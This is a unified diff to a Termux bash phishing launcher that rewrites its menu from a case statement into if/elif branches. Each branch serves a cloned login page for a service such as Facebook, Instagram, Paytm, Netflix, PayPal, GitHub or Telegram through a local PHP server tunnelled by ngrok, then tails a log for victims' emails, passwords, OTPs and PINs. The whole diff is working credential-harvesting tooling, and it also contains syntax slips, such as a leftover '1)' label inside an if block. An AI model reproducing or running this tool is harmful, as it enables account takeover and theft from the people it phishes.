@@ -26,6 +26,9 @@ php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
 ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
 kill -9 $php
 kill -9 $ngrok
+
+while :
+do
 clear
 echo -e "\e[94m   
 
@@ -100,16 +103,17 @@ ash() {
         }
 
         read -p $'\e[31m[\e[32m*\e[31m]\e[32m Enter Your Choice : \e[0m' option
-	case $option in 
-	        
-	                  1)cd /data/data/com.termux/files/usr/bin/phs
+	
+         if [ $option = 01 ] || [ $option = 1 ]
+         then
+	                    cd /data/data/com.termux/files/usr/bin/phs
                             cd facebook/
                             echo ""   
-			    echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'   
+			    echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"   
 			    php -S 127.0.0.1:4444 > /dev/null 2>&1 &    
 			    sleep 2  
 			    echo ""
-			    echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+			    echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
 			    ./ngrok http 4444 > /dev/null 2>&1 & 
 			    sleep 4
 			    echo ""
@@ -120,21 +124,22 @@ ash() {
 			    echo " "
 			    echo " "
 			    sleep 2
-			    echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'  
+			    echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"  
 			    echo "" 
 			    tail -f log.txt | grep -e "email" -e "pass" -e "approvals_code"
 	
-                             ;;
+                            break;
 			     
-			  
-			   2)cd /data/data/com.termux/files/usr/bin/phs
+	 elif [ $option = 02 ] || [ $option = 2 ]
+	 then
+			   cd /data/data/com.termux/files/usr/bin/phs
                            cd pinterest/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -145,23 +150,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "id" -e "password"      
 
-                            ;;
+                           break;
 
-			  
-
-
-		         3)cd /data/data/com.termux/files/usr/bin/phs
+	 elif [ $option = 03 ] || [ $option = 3 ]
+	 then
+		           cd /data/data/com.termux/files/usr/bin/phs
 			   cd instagram/
 			   echo ""      
-			   echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m' 
+			   echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m" 
 			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &  
 			   sleep 2
 			   echo "" 
-			   echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'     
+			   echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"     
 			   ./ngrok http 4444 > /dev/null 2>&1 &
 			   sleep 4
 			   echo ""
@@ -172,18 +176,21 @@ ash() {
 			   echo " "
 			   echo " "
 			   sleep 2
-			   echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+			   echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
 			   tail -f log.txt
-                           ;;
-
-                        4)cd /data/data/com.termux/files/usr/bin/phs
+			   
+                           break;
+			   
+	elif [ $option = 04 ] || [ $option = 4 ]
+        then
+                          cd /data/data/com.termux/files/usr/bin/phs
 			  cd UberEats-Phishing/
 			  echo " "
-			  echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+			  echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
 			  php -S 127.0.0.1:4444 > /dev/null 2>&1 & 
 			  sleep 2  
 			  echo "" 
-			  echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m' 
+			  echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m" 
 			  ./ngrok http 4444 > /dev/null 2>&1 &
 			  sleep 4   
 			  echo " "
@@ -194,19 +201,21 @@ ash() {
 			  echo " "
 			  echo " "
 			  sleep 2
-			  echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+			  echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
 			  tail -f log.txt | grep -e "Email_or_Phone" -e "password" -e "verificationCode"
 
-                          ;;
-                 
-                        5)cd /data/data/com.termux/files/usr/bin/phs
+                          break;
+			  
+        elif [ $option = 05 ] || [ $option = 5 ]
+        then
+                          cd /data/data/com.termux/files/usr/bin/phs
                           cd ola-otpbypass/
                           echo ""
-                          echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m' 
+                          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m" 
 		          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 		          sleep 2   
 		          echo ""
-		          echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'  
+		          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"  
 		          ./ngrok http 4444 > /dev/null 2>&1 &
 		          sleep 4   
 		          echo " "
@@ -217,19 +226,21 @@ ash() {
 		          echo " "
 			  echo " "
 			  sleep 2
-		          echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+		          echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
 		          tail -f log.txt | grep -e "number" -e "otp" -e "OTP"
 
-                          ;;
-                
-                        6)cd /data/data/com.termux/files/usr/bin/phs
+                          break;
+			  
+         elif [ $option = 06 ] || [ $option = 6 ]
+	 then
+                          cd /data/data/com.termux/files/usr/bin/phs
                           cd google-otp/
                           echo ""
-		          echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'    
+		          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"    
 		          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 		          sleep 2
 		          echo ""
-		          echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'   
+		          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"   
 		          ./ngrok http 4444 > /dev/null 2>&1 &
 		          sleep 4
 		          echo " "
@@ -240,27 +251,29 @@ ash() {
 			  echo " "
 		          echo " "
 			  sleep 2
-		          echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+		          echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
 		          tail -f log.txt | grep -e "email" -e "password" -e "OTP"
   
-                          ;;
-  
-                        7)cd /data/data/com.termux/files/usr/bin/phs
+                          break;
+			  
+       elif [ $option = 07 ] || [ $option = 7 ]
+       then
+                          cd /data/data/com.termux/files/usr/bin/phs
                           cd Paytm-Phishing/
                           echo ""
                           echo -e $'\e[1;33m[\e[0m\e[1;77m 1 \e[0m\e[1;33m]\e[0m\e[1;32m Paytm Sign In \e[0m' 
                           echo -e $'\e[1;33m[\e[0m\e[1;77m 2 \e[0m\e[1;33m]\e[0m\e[1;32m Paytm Sign UP \e[0m' 
                           echo ""
-                          read -p $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
-		          case $option in
-
+                          read -p $'\e[1;33m[\e[0m\e[1;77m >>> \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option1
+		          if [ $option1 = 1 ] || [ $option1 = 01 ]
+			  then
 			      1)cd paytm/
                                 echo ""
-                                echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                                echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                                 php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                                 sleep 2
                                 echo ""
-                                echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                                echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                                 ./ngrok http 4444 > /dev/null 2>&1 &
                                 sleep 4
                                 echo ""
@@ -271,21 +284,19 @@ ash() {
 			        echo " "
 			        echo " "
 			        sleep 2
-                                echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                                echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                                 echo ""
                                 tail -f log.txt | grep -e "email" -e "username" -e "password" -e "otp"
-
-                                ;;
-		esac
-	                	;;
+		
+	                	else
                 
-                              2)cd signup/
+                                cd signup/
                                 echo ""
-                                echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                                echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                                 php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                                 sleep 2
                                 echo ""
-                                echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                                echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                                 ./ngrok http 4444 > /dev/null 2>&1 &
                                 sleep 2
                                 echo ""
@@ -296,20 +307,24 @@ ash() {
 				echo " "
 			        echo " "
 				sleep 2
-                                echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                                echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                                 echo ""
                                 tail -f log.txt | grep -e "email" -e "loginPassword" -e "mobileNumber" -e "otp"
+				fi
+                                
+				break;
+				
+        elif [ $option = 08 ] || [ $option = 8 ]
+	then
 
-                                 ;;
-
-                        8)cd /data/data/com.termux/files/usr/bin/phs
+                          cd /data/data/com.termux/files/usr/bin/phs
                           cd Netflix/
                           echo ""
-                          echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 2
                           echo ""
-                          echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 4
                           echo ""
@@ -320,21 +335,22 @@ ash() {
 		          echo " "
 			  echo " "
 			  sleep 2
-                          echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                          echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                           echo ""
                           tail -f log.txt | grep -e "userLoginId" -e "password" -e "OTP"                 
 
-                           ;;
+                          break;
 
-
-                         9)cd /data/data/com.termux/files/usr/bin/phs
+           elif [ $option = 09 ] || [ $option = 9 ]
+	   then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd instafollow/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -345,20 +361,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"                        
 
-                           ;;
-
-                        10)cd /data/data/com.termux/files/usr/bin/phs
+                           break;
+			   
+               elif [ $option = 10 ]
+	       then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd amazonsign/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -369,20 +387,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "email" -e "password" -e "OTP"  
 
-                           ;;
+                           break;
 
-                        11)cd /data/data/com.termux/files/usr/bin/phs
+                  elif [ $option = 11 ]
+	          then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd whatsapp-phishing/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -393,20 +413,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "number" -e "OTP" -e "otp"      
 
-                           ;;
-
-                        12)cd /data/data/com.termux/files/usr/bin/phs
+                           break;
+			   
+	          elif [ $option = 12 ]
+	          then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd Linkedin/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -417,20 +439,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "email" -e "Email" -e "password" -e "pin" -e "Pin"       
 
-                           ;;
+                           break;
    
-                        13)cd /data/data/com.termux/files/usr/bin/phs
+                     elif [ $option = 13]
+	             then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd Hotstar-otp-bypass/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -441,20 +465,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "phoneNo" -e "OTP"       
 
-                            ;;
+                           break;
       
-                        14)cd /data/data/com.termux/files/usr/bin/phs
+                    elif [ $option = 14 ]
+	            then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd spotify/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -465,20 +491,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"        
 
-                           ;;
-
-                        15)cd /data/data/com.termux/files/usr/bin/phs
+                           break;
+			   
+	            elif [ $option = 15 ]
+	            then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd github/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -487,20 +515,22 @@ ash() {
                            echo ""
 	                   ash
 		           echo " "
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "login" -e "password" -e "otp"       
 
-                           ;;
-
-                        16)cd /data/data/com.termux/files/usr/bin/phs
+                           break;
+			   
+	        elif [ $option = 16 ]
+	        then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd ipfinder/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -511,21 +541,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f ip.txt        
 
-                           ;;
+                           break;
 
-               
-                        17)cd /data/data/com.termux/files/usr/bin/phs
+                  elif [ $option = 17 ]
+	          then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd Zomato-Phishing/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -536,21 +567,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "email" -e "otp" -e "OTP"                
 
-                           ;;
+                           break;
 
-
-                        18)cd /data/data/com.termux/files/usr/bin/phs
+                   elif [ $option = 18 ]
+	           then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd phonepay/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -561,20 +593,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "number" -e "otp"                       
 
-                            ;;
-
-                        19)cd /data/data/com.termux/files/usr/bin/phs
+                           break;
+			   
+	            elif [ $option = 19 ]
+	            then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd paypal/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -585,20 +619,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-                           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "login_email" -e "login_password" -e "otpCode"    
 
-                           ;;
-
-                        20)cd /data/data/com.termux/files/usr/bin/phs
+                           break;
+           
+	            elif [ $option = 20 ]
+	            then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd telegram/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 4
                            echo ""
@@ -609,20 +645,22 @@ ash() {
 		           echo " "
 			   echo " "
 			   sleep 2
-		           echo -e $'\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m'
+		           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
                            echo ""
                            tail -f log.txt | grep -e "phone_number" -e "phone_code"     
 
-                           ;;
-
-                        21)cd /data/data/com.termux/files/usr/bin/phs
+                           break;
+			   
+	            elif [ $option = 21 ]
+	            then
+                           cd /data/data/com.termux/files/usr/bin/phs
                            cd twitter/
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m'
+                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e $'\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m'
